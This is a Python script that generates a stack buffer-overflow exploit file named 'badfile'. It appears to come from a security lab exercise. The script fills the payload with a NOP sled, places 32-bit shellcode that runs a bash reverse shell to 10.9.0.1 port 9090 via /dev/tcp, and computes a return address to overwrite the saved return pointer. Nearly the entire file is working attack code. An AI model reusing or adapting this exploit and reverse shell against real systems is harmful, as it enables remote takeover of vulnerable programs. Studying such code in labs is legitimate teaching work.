#!/usr/bin/python3
import sys

EBP = 0xffffd0a8
BUF = 0xffffd038
LEN = 517
# Use 4 for 32-bit address and 8 for 64-bit address
INC = 4

def main():
  shellcode= (
    "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
    "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
    "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
    "/bin/bash*"
    "-c*"
    "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
    "AAAA"
    "BBBB"
    "CCCC"
    "DDDD"
  ).encode('latin-1')
  # Fill the content with NOP's
  content = bytearray(0x90 for i in range(LEN)) 

  ##################################################################
  # Put the shellcode somewhere in the payload
  # reminder = (LEN - len(shellcode)) % INC
  # start = LEN - len(shellcode) - reminder
  start = LEN - len(shellcode)
  content[start:start + len(shellcode)] = shellcode

  # Decide the return address value 
  # and put it somewhere in the payload
  ret = EBP + (INC * 2)
  while '0' in hex(ret)[2:] and ret + INC < BUF + start:
    print("Updating the new return address...")
    ret = ret + INC

  if '0' in hex(ret)[2:] or ret + INC > BUF + start:
    print("PARAMETERS:\n\t- Shellcode length = %d,\n\t- New return address = %s,\n\t- Shellcode address = %s" % (len(shellcode), hex(ret), hex(BUF + start)))
    print("Cannot find a new return address that doesn't contain a 0")
    return

  offset = (EBP + INC) - BUF
  content[offset:offset + INC] = (ret).to_bytes(INC,byteorder='little')

  print("PARAMETERS:\n\t- Distance = %d,\n\t- Shellcode length = %d,\n\t- New return address = %s = %s,\n\t- Shellcode address = %s." % (offset, len(shellcode), hex(ret), (ret).to_bytes(INC,byteorder='little'), hex(BUF + start)))

  ##################################################################

  # Write the content to a file
  with open('badfile', 'wb') as f:
    f.write(content)

if __name__ == "__main__":
  main()